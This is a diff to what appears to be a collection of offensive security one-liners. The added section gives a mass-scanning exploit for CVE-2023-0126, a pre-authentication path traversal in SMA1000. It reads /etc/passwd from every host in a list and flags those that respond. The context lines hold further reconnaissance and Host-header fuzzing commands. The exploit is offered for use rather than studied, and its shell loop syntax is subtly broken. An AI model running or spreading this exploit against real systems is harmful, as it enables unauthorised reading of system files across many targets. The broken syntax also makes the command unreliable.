@@ -241,3 +241,12 @@ cat subdomains.txt | waybackurls | httpx -mc 200 -ct | grep application/json
 ```
 ffuf -u https://target[.]com/FUZZ -H “Host: 127.0.0.1” -w /home/user/path/to/wordlist.txt -fs <regular_content_length>
 ```
+
+────────────────────────────────────────────────────────────────────────
+
+# CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000
+
+## OneLiner
+```
+cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
+```
